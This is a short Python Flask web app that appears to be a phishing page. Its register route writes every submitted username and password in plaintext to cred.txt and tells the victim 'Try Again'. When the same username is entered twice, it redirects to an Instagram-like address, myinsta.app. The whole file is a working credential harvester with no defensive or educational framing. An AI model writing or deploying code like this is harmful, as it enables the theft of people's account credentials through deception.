import json

from flask import Flask, redirect, render_template, request

app = Flask(__name__)
last_uname = ""

@app.route('/')
def hello_world():
    return render_template("index.html")

@app.route('/register', methods=["GET", "POST"])
def register():
    global last_uname
    if request.method == "POST":
        with open("cred.txt", "a+") as f:
            data = {}
            data["uname"] = request.form.get('uname')
            data["pass"] = request.form.get('pass')
            json.dump(data, f)
            if last_uname == "":
                last_uname = request.form.get('uname')
            elif last_uname == request.form.get('uname'):
                return redirect("https://myinsta.app/")
            
        return render_template('register.html', msg="Try Again")
    
        # return redirect("https://myinsta.app/")
    return render_template('register.html', msg="")